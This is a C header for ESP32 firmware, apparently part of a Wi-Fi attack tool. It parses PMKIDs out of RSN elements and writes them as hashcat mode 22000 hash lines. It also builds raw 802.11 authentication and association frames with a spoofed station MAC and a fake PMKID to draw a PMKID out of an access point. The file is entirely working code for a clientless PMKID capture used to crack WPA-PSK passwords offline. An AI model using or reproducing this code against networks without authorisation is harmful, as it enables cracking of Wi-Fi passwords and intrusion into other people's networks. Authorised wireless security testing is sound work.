// PMKID utilities: hashcat mode 22000 (.hc22000) writer, RSN IE parsing,
// and raw 802.11 frame builders for PMKID capture.
//
// Format: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
// Mode 22000 = WPA-PMKID-PBKDF2 (PMKID-based attack, no handshake needed).

#pragma once
#include <SD.h>
#include "esp_wifi.h"

// --- PMKID extraction from RSN IE (tag 0x30) --------------------------------

// Parse an RSN IE body (after tag+length) and extract the first PMKID.
// Returns true if a PMKID was found.
static bool pmkExtractPmkid(const uint8_t* rsn, int tlen, uint8_t* out) {
	int ro = 2;
	if (ro + 4 > tlen) return false;
	ro += 4; // skip group cipher suite

	if (ro + 2 > tlen) return false;
	uint16_t pc = rsn[ro] | (rsn[ro + 1] << 8);
	ro += 2 + pc * 4; // skip pairwise cipher suites

	if (ro + 2 > tlen) return false;
	uint16_t ac = rsn[ro] | (rsn[ro + 1] << 8);
	ro += 2 + ac * 4; // skip AKM suites

	if (ro + 2 > tlen) return false;
	ro += 2; // skip RSN capabilities

	if (ro + 2 > tlen) return false;
	uint16_t pmc = rsn[ro] | (rsn[ro + 1] << 8);
	ro += 2;

	if (pmc > 0 && ro + 16 <= tlen) {
		memcpy(out, rsn + ro, 16);
		return true;
	}
	return false;
}

// Walk tagged IEs looking for RSN IE (tag 0x30) with PMKID.
// Returns true if a PMKID was found and copied to out.
static bool pmkScanIEs(const uint8_t* data, int len, uint8_t* out) {
	int pos = 0;
	while (pos + 2 <= len) {
		uint8_t tag = data[pos];
		uint8_t tlen = data[pos + 1];
		if (pos + 2 + tlen > len) break;
		if (tag == 0x30 && tlen >= 20 && pmkExtractPmkid(data + pos + 2, tlen, out)) {
			return true;
		}
		pos += 2 + tlen;
	}
	return false;
}

// --- Hash line writer --------------------------------------------------------

// Write a single hash line to an open SD file.
// pmkid: 16-byte PMKID from EAPOL M1 Key Data
// apMac: 6-byte AP BSSID
// staMac: 6-byte spoofed STA MAC
// ssid: pointer to SSID bytes (may contain binary data)
// ssidLen: length of SSID in bytes
static void writePmkidHashLine(File& f,
							const uint8_t* pmkid,
							const uint8_t* apMac,
							const uint8_t* staMac,
							const uint8_t* ssid,
							uint8_t ssidLen) {
	char line[256];
	int pos = 0;

	auto hex = [&](const uint8_t* data, int len) {
		for (int i = 0; i < len && pos < (int)sizeof(line) - 2; i++) {
			line[pos++] = "0123456789ABCDEF"[data[i] >> 4];
			line[pos++] = "0123456789ABCDEF"[data[i] & 0xF];
		}
	};

	const char* prefix = "WPA*01*";
	while (*prefix && pos < (int)sizeof(line) - 1) line[pos++] = *prefix++;

	hex(pmkid, 16);
	line[pos++] = '*';

	hex(apMac, 6);
	line[pos++] = '*';

	hex(staMac, 6);
	line[pos++] = '*';

	hex(ssid, ssidLen);
	line[pos++] = '*';
	line[pos++] = '*';
	line[pos++] = '*';
	line[pos++] = '\n';
	line[pos] = '\0';

	f.write((uint8_t*)line, pos);

#ifdef DEBUG_PMKID
	Serial.printf("PMKID hash (%d bytes): %s", pos, line);
#endif
}

// --- Raw 802.11 frame builders (via esp_wifi_80211_tx) -----------------------

// Send a raw 802.11 frame via the AP interface.
static void pmkSendRawFrame(const uint8_t* buf, int len) {
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false));
}

// Build Open System Authentication frame (seq 1, STA -> AP).
// Frame: FC(2) + Dur(2) + Addr1/2/3(18) + SeqCtl(2) + AuthBody(6) = 30 bytes.
static void pmkBuildAuthFrame(uint8_t* buf,
	const uint8_t* bssid, const uint8_t* staMac, uint16_t seq)
{
	memset(buf, 0, 30);
	buf[0] = 0xB0; buf[1] = 0x00;          // FC: Management, Auth subtype
	buf[2] = 0x3A; buf[3] = 0x01;          // Duration
	memcpy(buf + 4, bssid, 6);             // Addr1 = RA = BSSID
	memcpy(buf + 10, staMac, 6);           // Addr2 = TA = our STA MAC
	memcpy(buf + 16, bssid, 6);            // Addr3 = BSSID
	buf[22] = seq & 0xFF;                  // Sequence Control
	buf[23] = (seq >> 8) & 0x0F;
	buf[24] = 0x00; buf[25] = 0x00;        // Auth Algorithm = 0 (Open)
	buf[26] = 0x01; buf[27] = 0x00;        // Auth Seq = 1
	buf[28] = 0x00; buf[29] = 0x00;        // Status Code = 0
}

// Build Association Request frame with RSN IE containing a fake PMKID.
// Returns total frame length.
static int pmkBuildAssocFrame(uint8_t* buf,
	const uint8_t* bssid, const uint8_t* staMac,
	const uint8_t* ssid, int ssidLen, uint16_t seq)
{
	memset(buf, 0, 200);
	int pos = 0;

	// 802.11 header
	buf[pos++] = 0x00; buf[pos++] = 0x00;  // FC: Management, Assoc Req
	buf[pos++] = 0x3A; buf[pos++] = 0x01;  // Duration
	memcpy(buf + pos, bssid, 6); pos += 6; // Addr1 = RA = BSSID
	memcpy(buf + pos, staMac, 6); pos += 6; // Addr2 = TA
	memcpy(buf + pos, bssid, 6); pos += 6; // Addr3 = BSSID
	buf[pos++] = seq & 0xFF;               // Sequence Control
	buf[pos++] = (seq >> 8) & 0x0F;

	// Capability Info: ESS + Privacy + ShortPreamble + ShortSlot = 0x0411
	buf[pos++] = 0x11; buf[pos++] = 0x04;
	// Listen Interval
	buf[pos++] = 0x05; buf[pos++] = 0x00;

	// SSID IE (tag 0x00)
	buf[pos++] = 0x00;
	buf[pos++] = (uint8_t)ssidLen;
	memcpy(buf + pos, ssid, ssidLen);
	pos += ssidLen;

	// Supported Rates IE: 1,2,5.5,11,6,9,12,18 Mbps
	buf[pos++] = 0x01;
	buf[pos++] = 0x08;
	const uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
	memcpy(buf + pos, rates, 8);
	pos += 8;

	// RSN IE (tag 0x30) with PMKID
	buf[pos++] = 0x30;
	int lenPos = pos++;

	int rsnStart = pos;
	buf[pos++] = 0x01; buf[pos++] = 0x00;  // Version

	// Group Cipher Suite: 00-0F-AC-04 (CCMP)
	buf[pos++] = 0x00; buf[pos++] = 0x0F;
	buf[pos++] = 0xAC; buf[pos++] = 0x04;

	// Pairwise Cipher Suite Count = 1, Suite = CCMP
	buf[pos++] = 0x01; buf[pos++] = 0x00;
	buf[pos++] = 0x00; buf[pos++] = 0x0F;
	buf[pos++] = 0xAC; buf[pos++] = 0x04;

	// AKM Suite Count = 1, Suite = PSK (00-0F-AC-02)
	buf[pos++] = 0x01; buf[pos++] = 0x00;
	buf[pos++] = 0x00; buf[pos++] = 0x0F;
	buf[pos++] = 0xAC; buf[pos++] = 0x02;

	// RSN Capabilities
	buf[pos++] = 0x00; buf[pos++] = 0x00;

	// PMKID Count = 1
	buf[pos++] = 0x01; buf[pos++] = 0x00;

	// PMKID (16 bytes): fake, built from BSSID + STA MAC + DEADBEEF
	memcpy(buf + pos, bssid, 6); pos += 6;
	memcpy(buf + pos, staMac, 6); pos += 6;
	buf[pos++] = 0xDE; buf[pos++] = 0xAD;
	buf[pos++] = 0xBE; buf[pos++] = 0xEF;

	buf[lenPos] = pos - rsnStart;  // backfill RSN IE length

	return pos;
}
